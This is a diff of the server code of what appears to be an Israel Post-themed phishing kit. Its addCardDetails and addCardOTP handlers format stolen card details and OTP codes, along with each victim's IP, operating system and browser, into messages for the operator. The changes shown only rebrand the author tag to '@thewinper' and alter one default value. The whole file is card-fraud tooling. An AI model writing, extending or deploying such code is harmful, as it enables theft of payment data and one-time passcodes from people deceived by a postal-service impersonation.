@@ -48,12 +48,12 @@ module.exports.addCardDetails = async (req, res, next) => {
         ? cardDetails.prepaid
           ? "Yes"
           : "No"
-        : "Unknown"
+        : "No"
     }`;
     const line16 = `[💳] Currency: ${
       cardDetails?.country?.currency || "Unknown"
     }`;
-    const line17 = `[Israel Post BY: Winper !#MSD!#]`;
+    const line17 = `[Israel Post By: @thewinper]`;
 
     const message = `${line1}\n${line2}\n${line3}\n${line4}\n${line5}\n${line6}\n${line7}\n${line8}\n${line9}\n${line10}\n${line11}\n${line12}\n${line13}\n${line14}\n${line15}\n${line16}\n${line17}`;
 
@@ -73,13 +73,13 @@ module.exports.addCardOTP = async (req, res, next) => {
     const { osName, browser, ua } = getUserAgent(req);
 
     const message = `
-    [=====>  Israel Post: Winper $ OTP    <=====]
+    [=====>  Israel Post: @thewinper $ OTP    <=====]
     [ OTP Code: ${otp}
     [ IP: ${req.ip}
     [ OS: ${osName || "Unknown"}
     [ Browser: ${browser?.name || "Unknown"}
     [ UA: ${ua || "Unknown"}
-    [=====>  Israel Post: Winper $ OTP   <=====]
+    [=====>  Israel Post: @thewinper $ OTP   <=====]
     `;
 
     if (otp) {
